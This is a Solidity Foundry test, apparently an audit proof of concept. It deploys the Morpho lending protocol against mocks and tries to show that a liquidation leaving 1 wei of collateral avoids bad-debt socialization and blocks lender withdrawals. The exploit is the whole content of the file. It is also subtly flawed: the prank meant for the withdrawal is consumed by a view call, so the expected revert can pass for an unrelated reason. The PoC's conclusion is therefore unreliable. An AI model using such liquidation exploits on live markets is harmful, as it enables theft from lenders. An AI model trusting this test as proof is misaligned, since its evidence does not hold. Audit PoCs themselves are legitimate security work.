// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Morpho} from "../src/Morpho.sol";
import {MarketParams, Id} from "../src/interfaces/IMorpho.sol";
import {ERC20Mock} from "../src/mocks/ERC20Mock.sol";
import {OracleMock} from "../src/mocks/OracleMock.sol";
import {IrmMock} from "../src/mocks/IrmMock.sol";
import {MarketParamsLib} from "../src/libraries/MarketParamsLib.sol";

contract AuditPoC is Test {
    using MarketParamsLib for MarketParams;

    Morpho public morpho;
    ERC20Mock public collateralToken;
    ERC20Mock public loanToken;
    OracleMock public oracle;
    IrmMock public irm;

    MarketParams public marketParams;
    Id public marketId;

    function setUp() public {
        morpho = new Morpho(address(this));
        collateralToken = new ERC20Mock();
        loanToken = new ERC20Mock();
        oracle = new OracleMock();
        irm = new IrmMock();

        marketParams = MarketParams({
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            oracle: address(oracle),
            irm: address(irm),
            lltv: 0.9e18
        });
        
        morpho.enableIrm(address(irm));
        morpho.enableLltv(0.9e18);
        morpho.createMarket(marketParams);
        marketId = marketParams.id();

        loanToken.setBalance(address(0x1), 1000e18); // Lender
        collateralToken.setBalance(address(0x2), 1000e18); // Borrower
        loanToken.setBalance(address(0x3), 1000e18); // Liquidator

        vm.prank(address(0x1)); loanToken.approve(address(morpho), type(uint256).max);
        vm.prank(address(0x2)); collateralToken.approve(address(morpho), type(uint256).max);
        vm.prank(address(0x3)); loanToken.approve(address(morpho), type(uint256).max);

        oracle.setPrice(1e36); // Set initial scale
    }

    function test_BadDebt_Dust_Bypass() public {
        vm.prank(address(0x1)); morpho.supply(marketParams, 100e18, 0, address(0x1), "");
        vm.prank(address(0x2)); morpho.supplyCollateral(marketParams, 100e18, address(0x2), "");
        vm.prank(address(0x2)); morpho.borrow(marketParams, 90e18, 0, address(0x2), address(0x2));

        oracle.setPrice(0.5e36); // Price crash

        // Liquidate but leave 1 wei
        vm.prank(address(0x3));
        morpho.liquidate(marketParams, address(0x2), 100e18 - 1, 0, "");

        (uint128 totalSupplyAssets,,,,,) = morpho.market(marketId);
        assertEq(totalSupplyAssets, 100e18, "Market zombified - assets not socialized!");
        
        vm.prank(address(0x1));
        (uint256 shares,,) = morpho.position(marketId, address(0x1));
        vm.expectRevert(); // Should fail due to missing liquidity
        morpho.withdraw(marketParams, 0, shares, address(0x1), address(0x1));
    }
}
